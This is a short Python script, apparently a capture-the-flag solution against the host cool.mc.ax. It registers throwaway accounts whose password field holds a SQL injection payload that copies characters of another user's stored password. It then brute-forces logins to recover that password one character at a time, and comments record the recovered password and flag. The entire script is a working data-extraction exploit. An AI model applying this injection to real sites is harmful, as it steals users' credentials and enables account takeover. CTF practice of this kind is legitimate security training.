import string
import requests
from random import SystemRandom

#nwinY6GFBqOLn55vInCFnraPJzjFZhYw
#flag{44r0n_s4ys_s08r137y_1s_c00l}
rand = SystemRandom()
list_char = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789')
passwd = ''

def create_user(username,i):
    url1 = 'https://cool.mc.ax/register'
    data = {'username':username,'password':f"'||(select substr(password,{i},1)from users)||'"}
    # print(data)
    r = requests.post(url=url1, data=data)
    # print(r.text)
    print('done')

def login():
    global passwd

    url2 = 'https://cool.mc.ax/'
    for char in string.ascii_letters+string.digits:
        # print(passwd + char, end='\r')
        data = {'username':username,'password':char}
        # print(data)
        r = requests.post(url=url2, data=data)
        # print(r.text)
        if 'You are logged in' in r.text:
            passwd += char
            print(passwd)
            break
    else:
        pass

for i in range(1,33):
    username = ''.join([rand.choice(list(list_char)) for _ in range(32)])
    create_user(username,i)
    login()